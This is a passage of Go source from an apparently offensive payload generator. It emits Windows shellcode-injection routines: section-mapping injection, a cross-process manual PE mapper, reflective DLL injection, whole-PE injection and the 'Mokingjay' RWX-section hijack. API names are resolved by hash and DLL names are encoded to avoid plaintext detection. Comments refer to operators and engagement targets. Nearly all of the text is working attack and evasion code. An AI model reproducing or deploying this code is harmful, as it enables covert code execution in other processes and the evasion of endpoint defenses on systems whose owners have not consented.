	wincall.CallG0(%s, uintptr(unsafe.Pointer(&h)), uintptr(0x1f0fff),
		uintptr(unsafe.Pointer(&oa)), uintptr(unsafe.Pointer(&cid)))
	if h == 0 {
		return
	}
	// NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL, &size, PAGE_EXECUTE_READWRITE,
	//   SEC_COMMIT, NULL).
	secSize := uintptr(len(payload))
	var sec uintptr
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&sec)), uintptr(0xf001f),
		uintptr(0), uintptr(unsafe.Pointer(&secSize)), uintptr(0x40),
		uintptr(0x8000000), uintptr(0))
	if sec == 0 {
		wincall.CallG0(%s, h)
		return
	}
	// Map into self (RW). GetCurrentProcess returns a -1 pseudo handle.
	cur, _, _ := wincall.CallG0(%s)
	var localView uintptr
	var localViewSize uintptr
	// NtMapViewOfSection(Section, Process, &Base, 0, 0, NULL, &ViewSize,
	//   ViewShare, 0, PAGE_READWRITE)
	wincall.CallG0(%s, sec, cur, uintptr(unsafe.Pointer(&localView)),
		uintptr(0), uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&localViewSize)),
		uintptr(0x1), uintptr(0), uintptr(0x04))
	if localView == 0 {
		wincall.CallG0(%s, sec)
		wincall.CallG0(%s, h)
		return
	}
	// Copy shellcode into the local view (shared with the target's view).
	for i, x := range payload {
		*(*byte)(unsafe.Pointer(localView + uintptr(i))) = x
	}
	// Map into the target (RX) — the same section, now visible remotely.
	var remoteView uintptr
	var remoteViewSize uintptr
	wincall.CallG0(%s, sec, h, uintptr(unsafe.Pointer(&remoteView)),
		uintptr(0), uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&remoteViewSize)),
		uintptr(0x1), uintptr(0), uintptr(0x20))
	if remoteView == 0 {
		wincall.CallG0(%s, sec)
		wincall.CallG0(%s, h)
		return
	}
	// Execute in the target at the remote view — no WriteProcessMemory.
	var thread uintptr
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&thread)), uintptr(0x1fffff),
		uintptr(0), h, remoteView, uintptr(0), uintptr(0), uintptr(0),
		uintptr(0), uintptr(0), uintptr(0))
	if thread != 0 {
		wincall.CallG0(%s, thread, uintptr(0), uintptr(0))
		wincall.CallG0(%s, thread)
	}
	wincall.CallG0(%s, sec)
	wincall.CallG0(%s, h)
}

`, hNtOP, hNtCS, hNtClose, hGCP, hNtMVOS, hNtClose, hNtClose, hNtMVOS, hNtClose,
		hNtClose, hNtCTE, hNtWFSO, hNtClose, hNtClose, hNtClose)
}

// peLoaderHelper emits the shared PE-loader subsystem used by pe06 (reflective
// DLL injection) and pe09 (whole-PE injection): an RVA->file-offset resolver and
// a cross-process manual mapper (parse PE headers, allocate SizeOfImage in the
// target, copy headers + sections, resolve imports locally and patch the remote
// IAT, apply base relocations, flip RX, return the mapped base + entry address).
// Emitted once per build (only one of pe06/pe09 is active at a time).
//
// EXPERIMENTAL — on-target verification required: the manual mapper resolves
// imports in the INJECTOR process (correct for system DLLs whose base is shared
// across processes via KnownDLLs; non-system imports may need an in-target
// resolver), and calls the PE entry via CreateRemoteThread (for a DLL the
// DllMain fdwReason argument is not set to DLL_PROCESS_ATTACH by this path — the
// entry runs with hinstDLL=base). The PE32+ header offsets are validated by
// cross-compile + on-target run, not by the Linux generator.
func (b *Builder) peLoaderHelper() string {
	b.api("kernel32.dll", "LoadLibraryA")   // hLoadLibraryA + hKernel32Dll
	b.api("kernel32.dll", "GetProcAddress") // hGetProcAddress
	_, hVAX := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hRPM := b.api("kernel32.dll", "ReadProcessMemory")
	_, hVPX := b.api("kernel32.dll", "VirtualProtectEx")
	return fmt.Sprintf(`// mapResult carries the mapped image base and the entrypoint VA in the target.
type mapResult struct {
	base  uintptr
	entry uintptr
}

// rvaToOff converts a relative virtual address to a file offset within the PE
// image ` + "`p`" + ` (the on-disk image bytes) by walking the section table. Headers
// (rva < sizeOfHeaders) map to themselves.
func rvaToOff(p []byte, rva uint32) uint32 {
	elfanew := *(*uint32)(unsafe.Pointer(&p[0x3c]))
	numSec := *(*uint16)(unsafe.Pointer(&p[int(elfanew)+6]))
	soh := *(*uint16)(unsafe.Pointer(&p[int(elfanew)+20]))
	sizeOfHeaders := *(*uint32)(unsafe.Pointer(&p[int(elfanew)+60]))
	if rva < sizeOfHeaders {
		return rva
	}
	secTab := int(elfanew) + 24 + int(soh)
	for i := 0; i < int(numSec); i++ {
		off := secTab + i*40
		va := *(*uint32)(unsafe.Pointer(&p[off+12]))
		vs := *(*uint32)(unsafe.Pointer(&p[off+8]))
		raw := *(*uint32)(unsafe.Pointer(&p[off+20]))
		if rva >= va && rva < va+vs {
			return raw + (rva - va)
		}
	}
	return 0
}

// manualMapPE maps a PE (DLL for pe06, EXE for pe09) into process ` + "`h`" + ` from the
// in-memory image ` + "`p`" + `: allocates SizeOfImage RW in the target, writes headers +
// sections, resolves imports locally (LoadLibraryA/GetProcAddress in the injector
// — valid for system DLLs whose base is shared across processes) and patches the
// remote IAT, applies base relocations for the load bias, flips the image RX, and
// returns the mapped base + entry address.
func manualMapPE(h uintptr, p []byte) mapResult {
	elfanew := *(*uint32)(unsafe.Pointer(&p[0x3c]))
	// OptionalHeader is at e_lfanew+24 (after Signature(4) + FileHeader(20)).
	oh := int(elfanew) + 24
	imageBase := *(*uintptr)(unsafe.Pointer(&p[oh+24])) // PE32+ ImageBase (QWORD)
	sizeOfImage := *(*uint32)(unsafe.Pointer(&p[oh+56]))
	aoEP := *(*uint32)(unsafe.Pointer(&p[oh+16]))
	// 1. Allocate SizeOfImage RW in the target at the preferred image base.
	targetBase, _, _ := wincall.CallG0(%s, h, imageBase, uintptr(sizeOfImage),
		uintptr(0x3000), uintptr(0x04))
	if targetBase == 0 {
		targetBase, _, _ = wincall.CallG0(%s, h, uintptr(0), uintptr(sizeOfImage),
			uintptr(0x3000), uintptr(0x04))
	}
	if targetBase == 0 {
		return mapResult{}
	}
	delta := targetBase - imageBase
	// 2. Copy headers + each section from the file image into the target.
	sizeOfHeaders := *(*uint32)(unsafe.Pointer(&p[oh+60]))
	var w uintptr
	wincall.CallG0(%s, h, targetBase, uintptr(unsafe.Pointer(&p[0])),
		uintptr(sizeOfHeaders), uintptr(unsafe.Pointer(&w)))
	numSec := *(*uint16)(unsafe.Pointer(&p[int(elfanew)+6]))
	soh := *(*uint16)(unsafe.Pointer(&p[int(elfanew)+20]))
	secTab := int(elfanew) + 24 + int(soh)
	for i := 0; i < int(numSec); i++ {
		off := secTab + i*40
		va := *(*uint32)(unsafe.Pointer(&p[off+12]))
		raw := *(*uint32)(unsafe.Pointer(&p[off+20]))
		srd := *(*uint32)(unsafe.Pointer(&p[off+16]))
		if srd == 0 {
			continue
		}
		wincall.CallG0(%s, h, targetBase+uintptr(va),
			uintptr(unsafe.Pointer(&p[raw])), uintptr(srd),
			uintptr(unsafe.Pointer(&w)))
	}
	// 3. Resolve imports: walk the import directory, LoadLibraryA each DLL in the
	// injector, GetProcAddress each function, and patch the remote IAT.
	dataDir := oh + 112 // PE32+: NumberOfRvaAndSizes at oh+108, dirs at oh+112
	impVA := *(*uint32)(unsafe.Pointer(&p[dataDir+8])) // index 1 (import)
	if impVA != 0 {
		impOff := int(rvaToOff(p, impVA))
		for {
			desc := p[impOff:] // 20-byte IMPORT_DESCRIPTOR
			nameRVA := *(*uint32)(unsafe.Pointer(&desc[12]))
			oft := *(*uint32)(unsafe.Pointer(&desc[0])) // OriginalFirstThunk (ILT)
			ft := *(*uint32)(unsafe.Pointer(&desc[16])) // FirstThunk (IAT)
			if nameRVA == 0 && oft == 0 && ft == 0 {
				break
			}
			nameOff := int(rvaToOff(p, nameRVA))
			end := nameOff
			for end < len(p) && p[end] != 0 {
				end++
			}
			dllBytes := append([]byte{}, p[nameOff:end]...)
			dllBytes = append(dllBytes, 0)
			dllBase, _, _ := wincall.CallG0(api(hKernel32Dll, hLoadLibraryA),
				uintptr(unsafe.Pointer(&dllBytes[0])))
			thunkRVA := ft
			if oft != 0 {
				thunkRVA = oft
			}
			thunkOff := int(rvaToOff(p, thunkRVA))
			iatVA := ft
			i := 0
			for {
				entry := *(*uintptr)(unsafe.Pointer(&p[thunkOff+i*8]))
				if entry == 0 {
					break
				}
				var fnAddr uintptr
				if entry&0x8000000000000000 != 0 {
					// Ordinal import: low 16 bits.
					fnAddr, _, _ = wincall.CallG0(api(hKernel32Dll, hGetProcAddress),
						dllBase, uintptr(entry&0xffff))
				} else {
					// Name import: entry is an RVA to IMPORT_BY_NAME (WORD hint + name).
					name2Off := int(rvaToOff(p, uint32(entry)))
					fnAddr, _, _ = wincall.CallG0(api(hKernel32Dll, hGetProcAddress),
						dllBase, uintptr(unsafe.Pointer(&p[name2Off+2])))
				}
				// Patch the remote IAT slot: targetBase + iatVA + i*8.
				wincall.CallG0(%s, h, targetBase+uintptr(iatVA)+uintptr(i*8),
					uintptr(unsafe.Pointer(&fnAddr)), uintptr(8),
					uintptr(unsafe.Pointer(&w)))
				i++
			}
			impOff += 20
		}
	}
	// 4. Apply base relocations for the load bias (delta).
	relocVA := *(*uint32)(unsafe.Pointer(&p[dataDir+40])) // index 5 (reloc)
	if relocVA != 0 && delta != 0 {
		relocOff := int(rvaToOff(p, relocVA))
		relocSize := *(*uint32)(unsafe.Pointer(&p[dataDir+44]))
		end := relocOff + int(relocSize)
		for relocOff < end {
			pageVA := *(*uint32)(unsafe.Pointer(&p[relocOff]))
			blkSize := *(*uint32)(unsafe.Pointer(&p[relocOff+4]))
			if blkSize == 0 {
				break
			}
			entries := int(blkSize-8) / 2
			for j := 0; j < entries; j++ {
				e := *(*uint16)(unsafe.Pointer(&p[relocOff+8+j*2]))
				typ := e >> 12
				off := uint32(e & 0xfff)
				if typ == 10 { // IMAGE_REL_BASED_DIR64
					patchVA := targetBase + uintptr(pageVA) + uintptr(off)
					var cur uintptr
					var rn uint32
					wincall.CallG0(%s, h, patchVA, uintptr(unsafe.Pointer(&cur)),
						uintptr(8), uintptr(unsafe.Pointer(&rn)))
					cur += delta
					wincall.CallG0(%s, h, patchVA, uintptr(unsafe.Pointer(&cur)),
						uintptr(8), uintptr(unsafe.Pointer(&w)))
				}
			}
			relocOff += int(blkSize)
		}
	}
	// 5. Flip the whole image RX (the loader is done writing).
	var old uintptr
	wincall.CallG0(%s, h, targetBase, uintptr(sizeOfImage), uintptr(0x20),
		uintptr(unsafe.Pointer(&old)))
	return mapResult{base: targetBase, entry: targetBase + uintptr(aoEP)}
}

`, hVAX, hVAX, hWPM, hWPM, hWPM, hRPM, hWPM, hVPX)
}

// pe06Body: reflective DLL injection (manual-map variant). Manually map a DLL
// (the supplied payload bytes = a PE/DLL file) into the target process and call
// its entrypoint via CreateRemoteThread — nothing touches disk. Uses the shared
// peLoaderHelper manual mapper. EXPERIMENTAL (see peLoaderHelper caveats).
func (b *Builder) pe06Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hCRT := b.api("kernel32.dll", "CreateRemoteThread")
	_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`func pe06Reflective(pid uint32, payload []byte) {
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	mr := manualMapPE(h, payload)
	if mr.entry == 0 {
		wincall.CallG0(%s, h)
		return
	}
	// Call the DLL entry (DllMain) via CreateRemoteThread with hinstDLL = base.
	tid := uint32(0)
	t, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(0), mr.entry, mr.base,
		uintptr(0), uintptr(unsafe.Pointer(&tid)))
	if t != 0 {
		wincall.CallG0(%s, t, uintptr(0xffffffff))
		wincall.CallG0(%s, t)
	}
	wincall.CallG0(%s, h)
}

`, hOP, hCH, hCRT, hWFSO, hCH, hCH)
}

// pe09Body: whole-PE injection. Manually map an entire EXE (the supplied payload
// bytes = a PE/EXE file) into the target process and call its entrypoint via
// CreateRemoteThread. Uses the shared peLoaderHelper manual mapper. EXPERIMENTAL
// (see peLoaderHelper caveats).
func (b *Builder) pe09Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hCRT := b.api("kernel32.dll", "CreateRemoteThread")
	_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`func pe09WholePE(pid uint32, payload []byte) {
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	mr := manualMapPE(h, payload)
	if mr.entry == 0 {
		wincall.CallG0(%s, h)
		return
	}
	// Call the EXE entrypoint via CreateRemoteThread.
	tid := uint32(0)
	t, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(0), mr.entry, uintptr(0),
		uintptr(0), uintptr(unsafe.Pointer(&tid)))
	if t != 0 {
		wincall.CallG0(%s, t, uintptr(0xffffffff))
		wincall.CallG0(%s, t)
	}
	wincall.CallG0(%s, h)
}

`, hOP, hCH, hCRT, hWFSO, hCH, hCH)
}

// pe20Body: Mokingjay. Load a vulnerable DLL (one that ships an already-RWX
// section — e.g. msys-2.0.dll) into the current process with LoadLibraryA, scan
// the loaded image with VirtualQuery for the RWX region, write shellcode into it,
// and execute via a local thread — no suspicious allocation is requested (the
// RWX region is the DLL's own). Target-specific: the operator must supply a DLL
// that genuinely contains a committed RWX section on the engagement target.
// Every API resolved by DJB2 hash.
//
// EXPERIMENTAL / target-specific — on-target verification required: which DLLs
// ship RWX sections varies by Windows build and installed software; the default
// (msys-2.0.dll) is the canonical example but is only present with MSYS2
// installed. Supply a verified vulnerable DLL via --dll.
func (b *Builder) pe20Body() string {
	b.api("kernel32.dll", "LoadLibraryA") // hLoadLibraryA + hKernel32Dll
	_, hVQ := b.api("kernel32.dll", "VirtualQuery")
	_, hCT := b.api("kernel32.dll", "CreateThread")
	_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	dllName := b.Spec.DLL
	if dllName == "" {
		dllName = "msys-2.0.dll"
	}
	args := make([]string, 0, len(dllName))
	for _, c := range dllName {
		args = append(args, fmt.Sprintf("0x%02x", byte(c)))
	}
	return fmt.Sprintf(`// MEMORY_BASIC_INFORMATION (x64) = 48 bytes (pe20-local for the local scan).
type memBasicInfo20 struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	PartitionId       uint16
	_                 [2]byte
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
	_                 [4]byte
}

func pe20Mokingjay(payload []byte) uintptr {
	// LoadLibraryA the vulnerable DLL (numeric-encoded name, no plaintext).
	nameBytes := []byte(%s)
	nameBytes = append(nameBytes, 0)
	dllBase, _, _ := wincall.CallG0(api(hKernel32Dll, hLoadLibraryA),
		uintptr(unsafe.Pointer(&nameBytes[0])))
	if dllBase == 0 {
		return 0
	}
	// VirtualQuery-scan the loaded image for a committed RWX region.
	addr := dllBase
	var mbi memBasicInfo20
	for {
		ret, _, _ := wincall.CallG0(%s, addr, uintptr(unsafe.Pointer(&mbi)),
			uintptr(unsafe.Sizeof(mbi)))
		if ret == 0 {
			break
		}
		// Stop when we leave the vulnerable DLL's allocation.
		if mbi.AllocationBase != dllBase {
			break
		}
		if mbi.State == 0x1000 && mbi.Protect == 0x40 &&
			mbi.RegionSize >= uintptr(len(payload)) {
			// Write shellcode into the DLL's RWX region (no alloc, no protect).
			target := mbi.BaseAddress
			for i, x := range payload {
				*(*byte)(unsafe.Pointer(target + uintptr(i))) = x
			}
			// Execute via a local thread at the hijacked RWX region.
			tid := uint32(0)
			t, _, _ := wincall.CallG0(%s, uintptr(0), uintptr(0), target,
				uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&tid)))
			if t != 0 {
				wincall.CallG0(%s, t, uintptr(0xffffffff))
				wincall.CallG0(%s, t)
			}
			return target
		}
		if mbi.RegionSize == 0 {
			break
		}
		addr = mbi.BaseAddress + mbi.RegionSize
	}
	return 0
}

`, "[]byte{"+strings.Join(args, ", ")+"}", hVQ, hCT, hWFSO, hCH)
}

// quiet an unused import warning if evasion import path is unused
var _ = evasion.LayerAES